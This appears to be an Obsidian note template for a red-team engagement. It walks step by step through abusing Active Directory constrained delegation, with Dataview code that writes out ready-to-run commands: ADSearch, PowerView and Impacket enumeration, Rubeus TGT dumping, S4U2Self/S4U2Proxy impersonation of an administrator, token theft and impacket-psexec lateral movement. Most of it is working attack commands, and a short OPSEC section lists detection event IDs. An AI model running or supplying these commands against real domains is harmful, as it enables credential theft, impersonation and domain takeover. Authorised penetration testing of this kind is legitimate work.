---
# Attack-specific fields
delegation_principal:
delegation_principal_fqdn:
allowed_spn:
impersonate_user:
machine_tgt:
s4u_ticket:
notes:
---

# Constrained Delegation

> [!abstract] Attack Summary
> Accounts or computers configured for constrained delegation can request service tickets on behalf of **any** domain user to a specific set of SPNs. Abuse requires obtaining the TGT of the delegation principal, then performing S4U2Self + S4U2Proxy to impersonate a privileged user to the allowed service.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Delegation Principal (sAMAccountName)",  `\`INPUT[text:delegation_principal]\``],
  ["Delegation Principal FQDN",             `\`INPUT[text:delegation_principal_fqdn]\``],
  ["Allowed SPN (msDS-AllowedToDelegateTo)",`\`INPUT[text:allowed_spn]\``],
  ["User to Impersonate",                   `\`INPUT[text:impersonate_user]\``],
]);
```

---

## Step 1 — Enumerate Constrained Delegation Principals

**Windows — ADSearch (computers)**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=*))\" " +
  "--attributes dnshostname,samaccountname,msds-allowedtodelegateto --json\n```");
```

**Windows — ADSearch (users)**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(&(objectCategory=user)(msds-allowedtodelegateto=*))\" " +
  "--attributes samaccountname,msds-allowedtodelegateto --json\n```");
```

**Windows — PowerView**
```dataviewjs
dv.paragraph("```powershell\n# Computers\nGet-DomainComputer -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto\n\n# Users\nGet-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-findDelegation " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + "\n```");
```

Fill in: `INPUT[text:delegation_principal]` | Allowed SPN: `INPUT[text:allowed_spn]`

---

## Step 2 — Obtain TGT of Delegation Principal

> [!info] Run this on the machine where the delegation principal (e.g. SQL-2$) is running, as SYSTEM.

**Windows — Rubeus Triage + Dump**
```dataviewjs
const p = dv.current();
const principal = p?.delegation_principal || "PRINCIPAL$";
dv.paragraph("```bash\n# Triage tickets\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe triage\n\n# Dump the TGT (look for Service: krbtgt)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /luid:0xLUID /service:krbtgt /nowrap\n\n# Alternative: Request TGT with hash (if you have NTLM/AES)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:" + principal + " /rc4:NTLM_HASH /nowrap\n```");
```

Paste TGT: `INPUT[text:machine_tgt]`

---

## Step 3 — Perform S4U2Self + S4U2Proxy

**Windows — Rubeus S4U**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const principal    = p?.delegation_principal    || "PRINCIPAL$";
const allowedSpn   = p?.allowed_spn             || "cifs/TARGET_HOST.domain.local";
const impersonate  = p?.impersonate_user        || "administrator";
const tgt          = p?.machine_tgt             || "BASE64_TGT";

dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe s4u " +
  "/impersonateuser:" + impersonate + " " +
  "/msdsspn:" + allowedSpn + " " +
  "/user:" + principal + " " +
  "/ticket:" + tgt + " /nowrap\n```");
```

Paste final S4U2Proxy ticket: `INPUT[text:s4u_ticket]`

---

## Step 4 — Use the Service Ticket

**Windows — Import and use**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const shortDomain = domain.split('.')[0].toUpperCase();
const impersonate = p?.impersonate_user || "administrator";
const ticket      = p?.s4u_ticket       || "BASE64_TICKET";
const allowedSpn  = p?.allowed_spn      || "cifs/TARGET_HOST.domain.local";
const targetHost  = allowedSpn.split('/')[1] || "TARGET_HOST.domain.local";

dv.paragraph("```bash\n# Import ticket into new logon session\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + impersonate + " /password:FakePass /ticket:" + ticket + "\n\n# Steal token from new PID\nsteal_token PID\n\n# Verify access (always use FQDN!)\nls \\\\" + targetHost + "\\c$\n```");
```

> [!danger] Always use the FQDN for the target — NetBIOS names cause ERROR_LOGON_FAILURE (1326).

**Linux — Impacket S4U**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain   ?? "DOMAIN";
const dc_ip       = b?.dc_ip    ?? "DC_IP";
const principal   = p?.delegation_principal    || "machine$";
const allowedSpn  = p?.allowed_spn             || "cifs/TARGET_HOST.domain.local";
const impersonate = p?.impersonate_user        || "administrator";

dv.paragraph("```bash\n# Get TGT for delegation principal\nimpacket-getTGT " + domain + "/" + principal + " -hashes :NTLM_HASH -dc-ip " + dc_ip + "\nexport KRB5CCNAME=" + principal.replace('$','') + ".ccache\n\n# Perform S4U delegation\nimpacket-getST -spn '" + allowedSpn + "' -impersonate " + impersonate + " -dc-ip " + dc_ip + " " + domain + "/" + principal + "\n\nexport KRB5CCNAME=" + impersonate + "@" + allowedSpn.replace('/','_') + ".ccache\nimpacket-psexec -k -no-pass " + domain + "/" + impersonate + "@" + (allowedSpn.split('/')[1] || "TARGET") + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - S4U2Self requests generate **Event 4769** on the DC.
> - S4U2Proxy generates a second 4769 for the delegated service.
> - Protocol Transition (S4U2Self without Kerberos) generates 4648 events.
> - Monitor for accounts requesting tickets *to* services they don't normally access.

---

## Notes & Results

`INPUT[textarea:notes]`
